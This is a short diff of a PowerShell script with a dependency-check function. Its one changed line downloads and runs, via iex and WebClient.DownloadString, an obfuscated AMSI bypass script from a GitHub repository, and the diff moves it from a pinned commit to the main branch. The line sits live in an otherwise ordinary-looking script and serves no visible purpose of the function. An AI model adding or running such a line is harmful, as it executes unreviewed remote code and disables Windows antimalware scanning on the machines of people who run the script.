@@ -120,4 +120,4 @@ function dependencychecks
   @{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
 
 }
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Matthew-Holt/AMSI-Bypasses/blob/bc53fed5ee6fe69b9166a6283314658b95121d84/bypass2_obfuscated.ps1')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Matthew-Holt/AMSI-Bypasses/blob/main/bypass2_obfuscated.ps1')
